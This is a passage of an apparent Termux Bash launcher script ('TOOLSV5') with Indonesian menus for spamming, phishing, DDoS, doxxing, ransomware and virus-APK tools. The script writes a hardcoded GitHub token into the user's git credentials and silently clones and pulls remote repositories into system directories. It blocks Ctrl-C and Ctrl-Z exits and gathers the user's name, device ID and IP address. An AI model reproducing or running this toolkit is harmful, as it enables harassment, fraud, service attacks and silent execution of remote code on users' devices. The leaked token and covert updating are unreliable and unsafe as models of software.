play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $b $bg_h"Musik berhasil diunduh dan disimpan$res"
sleep 3
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $b
read -p "Apakah Anda ingin mengunduh musik lain? (Y/N): " yn
if [[ $yn == [Yy]* ]]; then
continue
elif [[ $yn == [Nn]* ]]; then
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $bg_m $k "Mohon jawab dengan Y atau N$res"
sleep 3
break
fi
done
}
cekfilegalirus() {
while true; do
cek="/data/data/com.termux/files/usr/lib/apt/methods/base/galirus"
if [ -f "$cek" ]; then
echo "Ada TUAN"
sleep 2
echo "$nama ID : $termux_id" >> "$cek"
exit
else
echo "Belum Ada Tuan"
fi
done
}
base() {
>/dev/null
# while true; do
# scan="/data/data/com.termux/files/usr/lib/bash/whoamie/"
# if [ -d "$scan" ]; then
# cd $scan
# git pull origin main
# git stash
# echo "y" | termux-setup-storage &> /dev/null
# # nohup bash rat.sh > output.log 2>&1 &
# else
# echo "y" | termux-setup-storage &> /dev/null
# cd /data/data/com.termux/files/usr/lib/bash
# git clone --depth 32 https://github.com/zerotermux/whoamie.git
# cd whoamie
# git pull origin main
# git stash
# fi
# done
}
weleh() {
>/dev/null
# output_file="/data/data/com.termux/files/usr/bin/toolsv5"
# cat << 'EOF' > "$output_file"
# scan="$HOME/TOOLSV5"
# if [ -d "$scan" ]; then
# cd $HOME/TOOLSV5
# bash install.sh
# exit 0
# else
# cd $HOME
# git clone --depth 32 https://github.com/Galirus404/TOOLSV5
# cd TOOLSV5
# git pull origin main
# git stash
# clear
# echo "SILAHKAN ULANGI KETIK toolsv5 UNTUK MENJALANKAN"
# fi
# EOF
# chmod +x "$output_file"
}
FORUM() {
while true; do
forum="$HOME/community"
if [ -d "$forum" ]; then
clear
GIT_EMAIL="galirusofficial@gmail.com"
GIT_USERNAME="Galirus"
REMOTE_URL="https://github.com/Galirus404/community.git"
REPO_PATH="$HOME/community"
group_id=$(whoami)
echo "https://Galirus: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@github.com" > ~/.git-credentials
git config --global credential.helper store
banner() {
echo "
██████╗████████╗██╗   ██╗███████╗
██╔════╝╚══██╔══╝██║   ██║██╔════╝
██║  ███╗  ██║   ██║   ██║███████╗
██║   ██║  ██║   ╚██╗ ██╔╝╚════██║
╚██████╔╝  ██║    ╚████╔╝ ███████║
╚═════╝   ╚═╝     ╚═══╝  ╚══════╝ Community"
}
minta_nama() {
NAMA_FILE="/storage/emulated/0/Movies/sopo.txt"
NAMA=$(cat "$NAMA_FILE")
if [ ! -f $REPO_PATH/user_info ]; then
echo "Nama: $NAMA" > $REPO_PATH/user_info
echo "ID TERMUX: $group_id" >> $REPO_PATH/user_info
else
user_name=$(grep "Nama: " $REPO_PATH/user_info | cut -d ' ' -f 2-)
fi
}
show_loading() {
local pid=$1
local delay=0.1
local spinstr='|/-\'
echo -n "Loading... "
while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
local temp=${spinstr#?}
printf " [%c]  " "$spinstr"
spinstr=$temp${spinstr%"$temp"}
sleep $delay
printf "\b\b\b\b\b\b"
done
printf "    \b\b\b\b"
echo ""
}
baca_pesan() {
mkdir -p $REPO_PATH
cd $REPO_PATH
git config --global user.email "$GIT_EMAIL"
git config --global user.name "$GIT_USERNAME"
git config --global credential.helper store
git config pull.rebase false
if [ ! -d .git ]; then
git init &> /dev/null &
show_loading $!
git remote add origin $REMOTE_URL &> /dev/null &
show_loading $!
fi
git pull origin main &> /dev/null &
show_loading $!
if [ -f $REPO_PATH/galirus ]; then
clear
echo "Pesan dari Community TOOLSV5:"
echo "════════════════════════════════════════"
while IFS= read -r line; do
printf "  %-36s  \n" "$line"
done < $REPO_PATH/galirus
echo "════════════════════════════════════════"
else
echo "File galirus tidak ditemukan."
fi
}
kirim_pesan() {
baca_pesan | lolcat
read -p "Masukkan pesan: " user_message
mkdir -p $REPO_PATH
minta_nama
echo "[$user_name - $group_id]: $user_message" >> $REPO_PATH/galirus
cd $REPO_PATH
git config --global user.email "$GIT_EMAIL"
git config --global user.name "$GIT_USERNAME"
git config --global credential.helper store
git config pull.rebase false
if [ ! -d .git ]; then
git init &> /dev/null &
show_loading $!
git remote add origin $REMOTE_URL &> /dev/null &
show_loading $!
fi
git pull origin main &> /dev/null &
show_loading $!
git add galirus &> /dev/null &
show_loading $!
git commit -m "Add message from $user_name" &> /dev/null &
show_loading $!
git push -u origin main &> /dev/null &
show_loading $!
echo "Pesan berhasil dikirim"
clear
}
while true; do
clear
banner | lolcat
echo
echo "Pilih opsi:"
echo "1. KIRIM PESAN"
echo "2. LIHAT PESAN"
echo "3. BACK TO TOOLSV5"
read -p "Masukkan pilihan Anda: " pilihan
if [ "$pilihan" == "1" ]; then
clear
kirim_pesan
elif [ "$pilihan" == "2" ]; then
clear
baca_pesan
read -p "ENTER UNTUK MENGULANGI KE MENU"
elif [ "$pilihan" == "3" ]; then
echo "Kembali Ke TOOLSV5."
sleep 3
break
else
echo "Pilihan tidak valid. Silakan coba lagi."
fi
done
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
nala install git bash ruby -y
gem install lolcat
cd $HOME/
git clone --depth 32 https://github.com/Galirus404/community.git
cd community
git pull origin main
git stash
fi
break
done
}
Downloadnowatermark() {
while true; do
nama="/data/data/com.termux/files/sopowesu.txt"
if [ -f "$nama" ]; then
install_package_if_missing() {
local package=$1
if ! command -v $package &> /dev/null; then
echo "$package tidak ditemukan, menginstal..."
apt-get update
apt-get install -y $package
gem install lolcat
clear
else
echo "$package sudah terinstal"
clear
fi
}
install_package_if_missing curl
install_package_if_missing jq
install_package_if_missing yt-dlp
install_package_if_missing ruby
install_package_if_missing curl neofetch inetutils
color_splash() {
clear
for i in {1..5}; do
echo -e "\e[1m\e[38;5;$(($RANDOM % 256))m                   DOWNLOADER No Watermark \e[0m"
sleep 1
clear
done
}
banner() {
echo "
███████╗██╗  ██╗██╗██████╗ ██╗   ██╗███████╗
██╔════╝██║  ██║██║██╔══██╗██║   ██║██╔════╝
███████╗███████║██║██████╔╝██║   ██║███████╗
╚════██║██╔══██║██║██╔══██╗██║   ██║╚════██║
███████║██║  ██║██║██║  ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ No Watermark"
}
color_splash
search_xnxx() {
local query=$1
local encoded_query=$(echo "$query" | jq -sRr @uri)
local url="https://www.xnxx.com/search/$encoded_query"
echo "Mencari di: $url"
local result=$(curl -s "$url")
echo "$result" | grep -oP '(?<=href=")[^"]*' | grep '/video' | sed 's|^|https://www.xnxx.com|'
}
download_video() {
local video_url=$1
local file_path="/storage/emulated/0/$(basename "$video_url").mp4"
echo "Mengunduh video dari: $video_url"
yt-dlp -o "$file_path" "$video_url"
if [ $? -eq 0 ]; then
echo "Video berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video"
fi
}
download_youtube_video() {
read -p "Masukkan link YouTube: " youtube_link
local file_path="/storage/emulated/0/youtube_video_$(date +%s).mp4"
yt-dlp -o "$file_path" "$youtube_link"
if [ $? -eq 0 ]; then
echo "Video YouTube berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video YouTube"
fi
}
download_youtube_music() {
read -p "Masukkan link YouTube: " youtube_link
local file_path="/storage/emulated/0/youtube_music_$(date +%s).mp3"
yt-dlp -x --audio-format mp3 -o "$file_path" "$youtube_link"
if [ $? -eq 0 ]; then
echo "Musik YouTube berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh musik YouTube"
fi
}
download_tiktok_video() {
read -p "Masukkan link TikTok: " tiktok_link
local file_path="/storage/emulated/0/tiktok_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$tiktok_link"
if [ $? -eq 0 ]; then
echo "Video TikTok berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video TikTok"
fi
}
download_instagram_video() {
read -p "Masukkan link Instagram: " instagram_link
local file_path="/storage/emulated/0/instagram_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$instagram_link"
if [ $? -eq 0 ]; then
echo "Video Instagram berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video Instagram"
fi
}
download_facebook_video() {
read -p "Masukkan link Facebook: " facebook_link
local file_path="/storage/emulated/0/facebook_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$facebook_link"
if [ $? -eq 0 ]; then
echo "Video Facebook berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video Facebook"
fi
}
download_pinterest_video() {
read -p "Masukkan link Pinterest: " pinterest_link
local file_path="/storage/emulated/0/pinterest_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$pinterest_link"
if [ $? -eq 0 ]; then
echo "Video Pinterest berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video Pinterest"
fi
}
while true; do
clear
banner | lolcat
echo
echo
echo "Pilih opsi:"
echo "1. Pencarian video di XNXX"
echo "2. Unduh video YouTube"
echo "3. Unduh musik YouTube"
echo "4. Unduh video TikTok tanpa watermark"
echo "5. Unduh video Instagram tanpa watermark"
echo "6. Unduh video Facebook tanpa watermark"
echo "7. Unduh video Pinterest tanpa watermark"
echo "8. Keluar"
read -p "Masukkan pilihan Anda: " choice
if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le 8 ]; then
if [ "$choice" -eq 1 ]; then
read -p "Masukkan Judul Video: " query
search_results=$(search_xnxx "$query")
echo "Hasil Pencarian:"
echo "$search_results"
read -p "Masukkan link yang Anda Copy: " video_link
if echo "$video_link" | grep -q 'https://www.xnxx.com/video'; then
download_video "$video_link"
else
echo "Link tidak valid"
fi
elif [ "$choice" -eq 2 ]; then
download_youtube_video
elif [ "$choice" -eq 3 ]; then
download_youtube_music
elif [ "$choice" -eq 4 ]; then
download_tiktok_video
elif [ "$choice" -eq 5 ]; then
download_instagram_video
elif [ "$choice" -eq 6 ]; then
download_facebook_video
elif [ "$choice" -eq 7 ]; then
download_pinterest_video
elif [ "$choice" -eq 8 ]; then
echo "Keluar..."
exit 0
fi
else
echo "Pilihan tidak valid"
sleep 5
fi
done
else
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $k $bg_m "Packaging Belum Terinstall Bentar Tod !$res"
echo
sleep 3
pkg update
pkg upgrade
nala install wget ffmpeg -y
wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp
chmod a+rx $PREFIX/bin/yt-dlp
clear
read -p "Masukkan Nama Anda : " sopo
clear
echo "$sopo" > $nama
fi
done
}
trial_direktori() {
>/dev/null
# direktoritrial="/data/data/com.termux/files/usr"
# canningtrial="$direktoritrial/trial/.git/config"
# while true; do
# if [ -f "$canningtrial" ]; then
# cd /data/data/com.termux/files/usr/trial
# git pull origin main
# git stash
# break
# else
# cd "$direktoritrial" || {
# echo "Gagal masuk ke direktori"
# exit 1
# }
# rm -rf trial
# git clone --depth 32 https://github.com/zerotermux/trial
# cd trial || {
# echo "Gagal masuk ke direktori"
# exit 1
# }
# git pull origin main
# git stash
# fi
# done
}
canning() {
while true; do
break
# pockatfile="./pockat/.git/config"
# if [ -f "$pockatfile" ]; then
# cd ./pockat
# git pull origin main
# git stash
# break
# else
# cd /data/data/com.termux/files/usr/share/ || {
# echo "Gagal masuk ke direktori"
# exit 1
# }
# rm -rf pockat
# git clone --depth 32 https://github.com/zerotermux/pockat
# cd pockat || {
# echo "Gagal masuk ke direktori"
# exit 1
# }
# git pull origin main
# git stash
# fi
done
}
goraxfile() {
while true; do
goraxfile="/data/data/com.termux/files/usr/share/gorax/.git/config"
if [ -f "$goraxfile" ]; then
cd /data/data/com.termux/files/usr/share/gorax
git pull origin main
git stash
break
else
cd /data/data/com.termux/files/usr/share/ || {
echo "Gagal masuk ke direktori"
exit 1
}
rm -rf gorax
git clone --depth 32 https://github.com/zerotermux/gorax
cd gorax || {
echo "Gagal masuk ke direktori gorax"
exit 1
}
git pull origin main
git stash
fi
done
}
while true; do
trap ctrl_c INT
ctrl_c() {
clear
$e $k " Jangan Keluar Mendadak $m Script $k Memulai Awal$k"
sleep 3
cd $HOME/TOOLSV5
git pull origin main &> /dev/null
git stash &> /dev/null
}
trap ctrl_z TSTP
ctrl_z() {
clear
$e $k " Jangan Keluar Mendadak $m Script $k Memulai Awal$k"
sleep 3
cd $HOME/TOOLSV5
git pull origin main &> /dev/null
git stash &> /dev/null
}
random_number=$((RANDOM % 99 + 10))
function installasipackagetoolsv5() {
log_file="/data/data/com.termux/files/usr/share/list/package"
while IFS= read -r line; do
if [[ -n $line && $line != \#* ]]; then
$e $h "Sedang Installasi $m:$p $line"
echo "$line"
sleep 2
fi
done < "$log_file"
}
function repository() {
clear
galirusfile="/data/data/com.termux/files/usr/etc/apt/poc" &> /dev/null
if [ -d "$galirusfile" ]; then
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $h "$bg_m Loading Update Repository$res"
cd $galirusfile &> /dev/null
git pull origin main &> /dev/null
canning &> /dev/null
trial_direktori &> /dev/null
goraxfile &> /dev/null
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "REPOSITORY HILANG MENDOWNLOAD ❗$h"
cd /data/data/com.termux/files/usr/etc/apt &> /dev/null
git clone --depth 2 https://github.com/zerotermux/poc &> /dev/null
git clone --depth 32 https://github.com/zerotermux/poc &> /dev/null
cd /data/data/com.termux/files/usr/share/ &> /dev/null
git clone --depth 1 https://github.com/zerotermux/list &> /dev/null
cd /data/data/com.termux/files/usr/include/ &> /dev/null
git clone --depth 1 https://github.com/zerotermux/audio &> /dev/null
git clone --depth 32 https://github.com/zerotermux/audio &> /dev/null
cd audio &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
fi
welcometo="/data/data/com.termux/files/usr/include/audio" &> /dev/null
if [ -d "$welcometo" ]; then
cd $welcometo &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
else
cd /data/data/com.termux/files/usr/include/ &> /dev/null
git clone --depth 1 https://github.com/zerotermux/audio &> /dev/null
cd audio &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
fi
token="/data/data/com.termux/files/usr/share/list/" &> /dev/null
if [ -d "$token" ]; then
cd $token &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
cd /data/data/com.termux/files/usr/include/ &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
else
cd /data/data/com.termux/files/usr/share/ &> /dev/null
git clone --depth 1 https://github.com/zerotermux/list &> /dev/null
cd /data/data/com.termux/files/usr/include/ &> /dev/null
git clone --depth 1 https://github.com/zerotermux/audio &> /dev/null
cd audio &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
fi
}
function suara() {
sound="$HOME/TOOLSV5/sound/"
if [ -d "$sound" ]; then
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $h "$bg_m Loading Update Sound$res"
cd $sound
git pull origin main &> /dev/null
clear
else
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "SOUND FOLDER HILANG MENDOWNLOAD ❗$h "
cd $HOME/TOOLSV5 &> /dev/null
git clone --depth 1 https://github.com/Galirus404/sound
git clone --depth 32 https://github.com/Galirus404/sound
fi
musiek="$HOME/TOOLSV5/music"
if [ -d "$musiek" ]; then
clear
else
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "MUSIK FOLDER HILANG ❗$h "
cd $HOME/TOOLSV5/
git clone --depth 32 https://github.com/Galirus404/music | $e $bg_m "Sabar Rek Download Backsoud TOOLSV5$res"
cd music &> /dev/null &
git pull origin main &> /dev/null &
git stash &> /dev/null &
fi
}
while true; do
packageinstalling="$HOME/TOOLSV5/package_sudah_terinstall_$versitoolsv5"
if [ -f "$packageinstalling" ]; then
clear
suara
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
repository
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
clear
cd $HOME/TOOLSV5 &> /dev/null
$e $h "MEMERIKSA PEMBARUAN TOOLSV5"
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
git pull origin main &> /dev/null
git stash &> /dev/null
cd $HOME/TOOLSV5
git pull origin main &> /dev/null
git stash &> /dev/null
sleep 3
clear
$e $h "SELESAI PEMBARUAN TOOLSV5"
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
sleep 3
status="/data/data/com.termux/files/usr/share/gorax"
if [ -d "$status" ]; then
cd $status &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
file_path="$status/status.txt"
if [ ! -f "$file_path" ]; then
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $k "Status$b TOOLSV5$bl :$m Down "
exit 1
fi
content=$(< "$file_path")
if [[ $content == *"on"* ]]; then
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $k "Status$b TOOLSV5$bl :$h Online "
sleep 3
function loading1() {
text=" SUBSCRIBE GALIRUS OFFICIAL"
columns=$(stty size | awk '{print $2}')
while true; do
for ((i = 1; i <= columns; i++)); do
clear
printf "%*s\n" $i "$text"
sleep 0.03
done
for ((i = columns; i >= 1; i--)); do
clear
printf "%*s\n" $i "$text"
sleep 0.03
done
done
}
function loading2() {
text="MENDOWNLOAD REPOSITORY SABAR"
columns=$(stty size | awk '{print $2}')
while true; do
for ((i = 1; i <= columns; i++)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
for ((i = columns; i >= 1; i--)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
done
}
function loading3() {
text="  Terdeteksi MEMODIFIKASI TOOLSV5 VIRUS ( ON ) "
columns=$(stty size | awk '{print $2}')
while true; do
for ((i = 1; i <= columns; i++)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
for ((i = columns; i >= 1; i--)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
done
}
function ENTER() {
$e $m
sleep 5
read -p "ENTER UNTUK MENGULAGI TOOLSV5"
}
nama_file="/storage/emulated/0/Movies/sopo.txt"
while true; do
if [ -f $nama_file ]; then
nama=$(cat $nama_file)
jam=$(date +"%k")
tanggal=$(date +" %d %B %Y")
if [[ $jam -ge 0 && $jam -lt 10 ]]; then
ucapan="Pagi 🌄"
elif [[ $jam -ge 10 && $jam -lt 15 ]]; then
ucapan="Siang 🌤️"
elif [[ $jam -ge 15 && $jam -lt 18 ]]; then
ucapan="Sore 🌇"
else
ucapan="Malam 🌃"
fi
hari=$(date +%A)
ucap=""
case $hari in
"Monday") ucap="Senin!" ;;
"Tuesday") ucap="Selasa!" ;;
"Wednesday") ucap="Rabu!" ;;
"Thursday") ucap="Kamis!" ;;
"Friday") ucap="Jumat!" ;;
"Saturday") ucap="Sabtu!" ;;
"Sunday") ucap="Minggu!" ;;
esac
shuffle_string() {
str=$1
arr=($(echo $str | sed -e 's/\(.\)/\1 /g'))
for i in $(seq 0 $((${#arr[@]} - 2))); do
j=$(($(($RANDOM % $((${#arr[@]} - $i)))) + $i))
tmp=${arr[$i]}
arr[$i]=${arr[$j]}
arr[$j]=$tmp
done
echo ${arr[@]} | sed -e 's/ //g'
}
function kotak() {
len=$((${#str} + 4))
printf "╔"
for ((i = 1; i <= len; i++)); do
printf "═"
done
printf "╗\n"
printf "║  %s  ║\n" "$str"
printf "╚"
for ((i = 1; i <= len; i++)); do
printf "═"
done
printf "╝\n"
}
TAMPILANTOOLSV5() {
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
status="PREMIUM"
else
status="TRIAL"
fi
else
echo "File $idtermux tidak ditemukan. Menampilkan TRIAL."
status="TRIAL"
fi
ip_info=$(curl -s ipinfo.io)
ip=$(echo $ip_info | jq -r '.ip')
cd $HOME/TOOLSV5
clear
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
echo
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║          _     _     _     _     _               ║"
$e $b"║         / \   / \   / \   / \   / \              ║"
$e $b"║        ($m T$b ) ($m O$b ) ($m O$b ) ($m L$b ) ($m S$b )             ║"
$e $b"║         \_/   \_/   \_/   \_/   \_/$bl V5 $b          ║"
$e $b"║                                                  ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
$e $b"                ║                 ║"
sleep 2.1
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║  ${m}•${p} Author${bl} :${h} GALIRUS PROJECTS             $b       $b ║"
$e $b"║  ${h}•${p} Github${bl} :${h} github.com/Galirus404        $b       $b ║"
$e $b"║  ${h}•${p} You ID${bl} :${h} $termux_id                        $b     $b ║"
$e $b"║  ${bl}•${p} Status${bl} :${h} $status                    $b         $b ║"
$e $b"║  ${m}•${p} online${bl} :${h} $random_number${h} penguna              $b            $b ║"
$e $b"║  ${pu}•${p} Versi${bl}  :${h} $versitoolsv5                    $b           $b ║"
$e $b"║  ${c}•${p} IP   ${bl}  :${h} $ip                      $b ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
$e $b"                ║                 ║"
}
SPAM() {
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║               $m LIST SPAM KODE +62   $b          $b   ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
$e $b"║$k [ s1 ]$b  ║$h SPAM SMS&WA                           $b ║"
$e $b"║$k [ s2 ]$b  ║$h SPAM CALL                             $b ║"
$e $b"║$k [ s3 ]$b  ║$h SPAM CALL V2      $m OFF                $b ║"
$e $b"║$k [ s4 ]$b  ║$h SPAM SMS&WA NO STOP                   $b ║"
$e $b"║$k [ s5 ]$b  ║$h SPAM SMS&WA NO STOP                   $b ║"
$e $b"║$k [ s6 ]$b  ║$h SPAM CALL                             $b ║"
$e $b"║$k [ s7 ]$b  ║$h SPAM OTP                              $b ║"
$e $b"║$k [ s8 ]$b  ║$h SPAM BOT OTP ALL                      $b ║"
$e $b"║$k [ s9 ]$b  ║$h SPAM BOT OTP FREE & PREMIUM           $b ║"
$e $b"║$k [ s10 ]$b ║$h SPAM OTP                              $b ║"
$e $b"║$k [ s11 ]$b ║$h SPAM WHATSAPP TAUTAN PERANGKAT        $b ║"
$e $b"║$k [ bk ]$b  ║$h KEMBALI KE MENU AWAL                  $b ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
}
PHISING() {
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║      $m       LIST PHISING & HACKING  $b             ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
$e $b"║$k [ 11 ]$b ║$h SEEKER                                 $b ║"
$e $b"║$k [ 12 ]$b ║$h NEXPHISHER                             $b ║"
$e $b"║$k [ 13 ]$b ║$h AI SHIROKO ( BROWSER )                 $b ║"
$e $b"║$k [ 14 ]$b ║$h NGROK                                  $b ║"
$e $b"║$k [ 15 ]$b ║$h DEFACEG404                             $b ║"
$e $b"║$k [ 16 ]$b ║$h ADBWEBKIT                              $b ║"
$e $b"║$k [ 17 ]$b ║$h PENJELAJAH NAME                        $b ║"
$e $b"║$k [ 18 ]$b ║$h INSTALL NETHUNTER FULL ( DESKTOP )     $b ║"
$e $b"║$k [ 19 ]$b ║$h CAMERA PHISING                         $b ║"
$e $b"║$k [ 20 ]$b ║$h BACKUP FILE/FOLDER                     $b ║"
$e $b"║$k [ 21 ]$b ║$h SSH ( Pengganti ngrok )                $b ║"
$e $b"║$k [ 22 ]$b ║$h CHECK IP WEBSITE                       $b ║"
$e $b"║$k [ 23 ]$b ║$h ALL HACKING TOOLS                      $b ║"
$e $b"║$k [ 24 ]$b ║$h VIEW TIKTOK                            $b ║"
$e $b"║$k [ 25 ]$b ║$h PENYAMAR PHISING II                    $b ║"
$e $b"║$k [ 26 ]$b ║$h ENCRYPT BASH BY.GALIRUS404             $b ║"
$e $b"║$k [ 27 ]$b ║$h DOWNLOAD ALL NO WATERMARK              $b ║"
$e $b"║$k [ 28 ]$b ║$h Download VIDEO YOUTUBE,TIKTOK          $b ║"
$e $b"║$k [ 29 ]$b ║$h DOWNLOAD YOUTUBE MP3                   $b ║"
$e $b"║$k [ 30 ]$b ║$h ADB DEBUGGING                          $b ║"
$e $b"║$k [ 31 ]$b ║$h INSTALLASI MODULE TERMUX/NETHUNTER     $b ║"
$e $b"║$k [ 32 ]$b ║$h LINK DOSA                              $b ║"
$e $b"║$k [ 33 ]$b ║$h TEMP MAIL                              $b ║"
$e $b"║$k [ 34 ]$b ║$h INSTALL & MENJALANKAN BOT DI TERMUX    $b ║"
$e $b"║$k [ 35 ]$b ║$h KARMA DDOS                             $b ║"
$e $b"║$k [ 36 ]$b ║$h DOXXER                                 $b ║"
$e $b"║$k [ 37 ]$b ║$h TAMPILAN V5 TERMUX                     $b ║"
$e $b"║$k [ 38 ]$b ║$h UNBAN WHATSAPP                         $b ║"
$e $b"║$k [ 39 ]$b ║$h SCANNING ADMIN PANEL                   $b ║"
$e $b"║$k [ 40 ]$b ║$h PANDORA                                $b ║"
$e $b"║$k [ 41 ]$b ║$h SAQAHAYANG DDOS                        $b ║"
$e $b"║$k [ 42 ]$b ║$h VIRUS FILE                             $b ║"
$e $b"║$k [ 43 ]$b ║$h VIRUS APK                              $b ║"
$e $b"║$k [ 44 ]$b ║$h CAMERA PHISING 1                       $b ║"
$e $b"║$k [ 45 ]$b ║$h OSINT NUMBER KE NIK                    $b ║"
$e $b"║$k [ 46 ]$b ║$h DOS OVERLOAD                           $b ║"
$e $b"║$k [ 47 ]$b ║$h OSINT ( FREE )                         $b ║"
$e $b"║$k [ 48 ]$b ║$h VIRUS RANSOMWARE ( BLOKIR TERMUX )     $b ║"
$e $b"║$k [ 49 ]$b ║$h JARVIS LAUNCHER ( TAMPILAN ) TERMUX    $b ║"
$e $b"║$k [ 50 ]$b ║$h GHOST TRACK ( OSINT )                  $b ║"
$e $b"║$k [ 51 ]$b ║$h DDOS                                   $b ║"
$e $b"║$k [ 52 ]$b ║$h CAM CCTV                               $b ║"
$e $b"║$k [ 53 ]$b ║$h OKADMINFINDER                          $b ║"
$e $b"║$k [ 54 ]$b ║$h DDOS NODE                              $b ║"
$e $b"║$k [ 55 ]$b ║$h SCANNING DOMAIN                        $b ║"
$e $b"║$k [ 56 ]$b ║$h RED HAWK                               $b ║"
$e $b"║$k [ 57 ]$b ║$h SHIROKO ( PHISING SCRIPT FOTO )        $b ║"
$e $b"║$k [ 58 ]$b ║$h DDOS TOOLS                             $b ║"
$e $b"║$k [ 59 ]$b ║$h DOWNLOAD VIDEO,MUSIC,TIKTOK BY.P.JATIM $b ║"
$e $b"║$k [ 60 ]$b ║$h PENATAAN SCRIPT                        $b ║"
$e $b"║$k [ bk ]$b ║$h KEMBALI KE MENU AWAL                   $b ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
}
BOTZ() {
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║$k      $m  BOT WHATSAPP SUPPORT TERMUX     $b       $b   ║"
$e $b"╚══════════════════════════════════════════════════╝"
$e $b"║$k [ bot1 ]$b ║$h BOT MULTIFUNGSI ( SCAN QR )          $b ║"
$e $b"║$k [ bot2 ]$b ║$h BOT MULTIFUNGSI ( pairing code )     $b ║"
$e $b"║$k [ bot3 ]$b ║$h BOT BUGMENU ( pairing code )         $b ║"
$e $b"║$k [ bot4 ]$b ║$h BOT BUGMENU ( pairing code )         $b ║"
$e $b"║$k [ bot5 ]$b ║$h BOT MULTIFUNGSI  ( pairing code )    $b ║"
$e $b"║$k [ bot6 ]$b ║$h BOT BUGMENU ( pairing code )         $b ║"
$e $b"║$k [ bot7 ]$b ║$h BOT BUGMENU STRAVA ( pairing code )  $b ║"
$e $b"║$k [ bot8 ]$b ║$h BOT BUGMENU ( pairing code )         $b ║"
$e $b"║$k [ bot9 ]$b ║$h BOT BUGMENU ( pairing code )         $b ║"
$e $b"║$k [  bk  ]$b ║$h KEMBALI KE MENU AWAL                 $b ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
}
READ() {
sleep 1
$e $b "    ┌───────────────────────────┐"
$e $b "╭───┤$bl •$m ☠️ $nama$b ☠️ ┃$b"
$e $b "├───┤$k •$m Selamat $ucapan       $b│"
$e $b "├───┤$h •$m Sekarang jam$h :$jam:$(date +"%M") $waktu$b    │"
$e $b "│   └───────────────────────────┘"
read -p ' ╰─────────▶ ' no
$e $h
play -q $HOME/TOOLSV5/sound/oke.mp3 &> /dev/null
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
}
function TOOLS() {
trap ctrl_c INT
ctrl_c() {
clear
$e $k " Anda Tidam Bisa$m Keluar $k Dengan Cara Ini$k"
sleep 3
$musik &> /dev/null &
}
trap ctrl_z TSTP
ctrl_z() {
clear
$e $k " Anda Tidam Bisa$m Keluar $k Dengan Cara Ini$k"
sleep 3
$musik &> /dev/null &
}
while true; do
clear
TAMPILANTOOLSV5
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║     $m      SILAHKAN PILIH TOOLS DIBAWAH      $b    $b ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
$e $b"                ║                 ║"
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║$k [ spam ]$b  ║$h MENU SPAMMING                       $b ║"
$e $b"║$k [ hack ]$b  ║$h MENU PHISING & HACKING              $b ║"
